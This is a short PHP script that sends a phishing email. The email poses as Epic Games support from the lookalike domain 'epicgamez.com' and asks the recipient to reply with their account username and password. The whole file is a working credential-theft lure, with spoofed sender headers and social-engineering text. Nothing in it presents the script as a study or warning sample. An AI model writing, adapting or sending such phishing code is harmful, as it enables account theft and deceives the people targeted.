<?php
$to = "mzamza48910@gmail.com";
$subject = "Password Reset";
$txt = "Dear Gamer,<br>We have received a request for change of password for your epic games account please reply with your username and password to confirm that it is you that have sent this request. <br> Regards<br>Epic Support Team";
$headers = "From: epicgamessupport@epicgamez.com" . "\r\n";

mail($to, $subject, $txt, $headers);
